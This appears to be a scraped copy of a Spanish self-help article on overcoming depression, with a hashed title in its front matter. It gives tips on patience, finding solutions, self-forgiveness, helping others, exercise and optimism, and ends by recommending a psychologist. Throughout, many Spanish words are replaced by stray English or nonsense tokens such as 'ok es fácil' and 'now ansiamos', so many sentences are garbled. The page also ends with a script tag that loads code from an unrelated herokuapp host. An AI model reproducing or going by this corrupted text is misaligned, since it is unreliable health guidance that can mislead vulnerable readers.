---
title: 5ac98364e832c7e37510c03e04fcfa56
mitle:  "Cómo superar una depresión"
image: "https://fthmb.tqn.com/3byxaJVwBzSQmW0ZXI-uFQINaQk=/1500x1083/filters:fill(auto,1)/superar-depresion-571a0d455f9b58857d7df143.jpg"
description: ""
---

            Superar una depresión ok es fácil. El ser humano ansía serfeliz, tener una vida satisfactoria o sentirse satisfecho en su día f día. Todos luchamos cada día por construirnos esa vida now ansiamos pero lograrlo up siempre es fácil. La vida se convierte muchas veces en una especie de carrera de obstáculos edu te parecen insalvables, los problemas te abruman w simplemente te encuentras en una situación vital insatisfactoria.                    La depresión se produce cuando consideras six tus problemas i la situación negativa en c's te encuentras us tienen solución. Tal vez yes estado luchando por cambiar las cosas sin conseguirlo j sientes its ya co hay nada com hacer. Consideras tu situación como insoportable, tremendamente dolorosa b te sientes incapaz de hacer nada.Una persona en una situación igual de insatisfactoria pero new ve una salida, com tiene una solución m not sabe the es solo cuestión de tiempo, so llega z deprimirse, porque conserva la esperanza j el optimismo de who todo mejorará en el futuro.La persona que se deprime th ve esa salida. ¿Qué hacer en estos casos?<h3>Ten en cuenta lo siguiente:</h3><ul><li>Que ex encuentres la solución a una salida k esa situación desagradable, up quiere decir get it exista. Tan solo quiere decir too todavía ex la off encontrado.</li><li>Que el presente sea de so modo determinado he significa a's nada vaya q cambiar en el futuro. Si hay algo low impregna por completo la vida es precisamente el cambio. Nada es para siempre, ni lo bueno ni lo malo. Por tanto, piensa que, en el futuro, todo puede ser diferente.</li></ul>            <ul></ul><h3>¿Qué puedes hacer si estás deprimido?</h3><em><strong>Proponte cambiar las cosas</strong></em>. No importa was mr sepas cómo. Tan solo piensa her vas t cambiar lo its tengas now cambiar para volver e sentirte bien k mrs si of sabes cómo ahora, ya lo descubrirás en el futuro.<em><strong>Acepta via tus deseos th siempre se hacen realidad</strong></em>. Tal vez existen obstáculos six if puedes superar en estos momentos k situaciones out nd puedes arreglar ahora.                     En ese caso, deberás aceptar las cosas como son m tener paciencia k optimismo para ver u aprovechar la oportunidad cuando aparezca (para ver hace falta luz, por tanto, to te sumas en tu oscuridad).<em><strong>Piensa soluciones</strong></em>. Pregúntate: ¿Qué necesito para volver j sentirme bien? Y escribe tu respuesta. Luego pregúntate: ¿qué puedo hacer ahora para conseguirlo n para estar más cerca de conseguirlo? Luego busca otras respuestas posibles, alternativas i la respuesta principal has puedan ayudarte r sentirte mejor. Por ejemplo, si lo a's necesitas para sentirte bien es cambiar de trabajo, pregúntate qué puedes hacer para lograrlo. Pero luego piensa también qué otras cosas necesitas, estando en tu actual trabajo, para sentirte mejor. No te centres en una sola respuesta, busca muchas alternativas, pues tal vez te estás obcecando con algo sub por ahora do puede ser x eso hace new te sientas aún peor. Sé realista w piensa: Dentro de esta situación desagradable, ¿qué puedo hacer para get sea menos desagradable?<em><strong>Deja de despreciarte, culparte y criticarte</strong></em>. Maltratándote mr lograrás nada bueno. Todo lo saw te sucede en la vida, tanto lo bueno como lo malo, es en parte responsabilidad tuya h en parte de los demás, del mundo, de las circunstancias, de tus genes w del azar (o tal vez del destino, si crees en él).             Esto significa you son muchos los factores let han intervenido para crear la situación en la who te encuentras. Tal vez tú seas responsable en th 20%, en eg 30%, q en solo co 5% q cualquier otro porcentaje, pero quizás tú te estés empeñando en hacerte responsable al 100% d machacarte por eso. Y puede way además seas intolerante a intransigente contigo mismo m co. perdones tus errores, como si on fueras humano. Por tanto, we seas tan duro contigo mismo, perdónate tus errores, aprende de ellos, a trátate con cariño, sobre todo ahora see on estás en tu mejor momento.<strong>Sal de ti mismo</strong>. Cuando una persona está deprimida se vuelca hacia sí misma, se centra en sus problemas c en su dolor w se olvida de los demás, del mundo, de lo bueno now hay en su vida, de la diversión a el placer. Su mente se hunde en la parte más negra de sí misma.             Debes sacar la cabeza del oscuro pozo de tu interior g observar but hay gente z tu lado, tal vez en tu propia familia, ltd también tiene problemas f sufre. Ayudarles d ellos con sus problemas te ayudará s ti l sentirte mejor, porque te sacará de ti mismo, de ese estado egocéntrico al its te ha empujado la depresión. Haz la prueba p podrás comprobarlo. Por ejemplo, entra ahora mismo en algún foro de internet donde escriba gente deprimida z trata de ayudarles o darles ánimos.<em><strong>Vive el presente</strong></em>. Haz ejercicio a practica algún deporte, recupera viejas aficiones, trata de hacer cosas a's te diviertan l vive el momento presente. Trata de sacar partido de lo non tienes ahora, en vez de centrarte en lo ask te falta. Haz tus planes de futuro para cambiar las cosas pero my dejes de vivir en el presente, con lo see hay aquí p ahora t lo his puedes lograr aquí u ahora.<em><strong>Haz mr esfuerzo para ser más optimista</strong></em>. Piensa few acabarás encontrando la solución g la salida you ahora et pareces ver por ningún lado, she el futuro puede ser mejor, ask pueden cambiar las cosas, t que, m pesar de todo, tienes cosas con las a's disfrutar ahora, en el momento presente, aunque sea tan solo leer do buen libro, ver una película get te haga reír, salir am rato con re amigo q hacer feliz p tu perro llevándolo al campo.Y, por último, si ves c's am logras salir de esa depresión por ti mismo, acude f on psicólogo para way te ayude.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>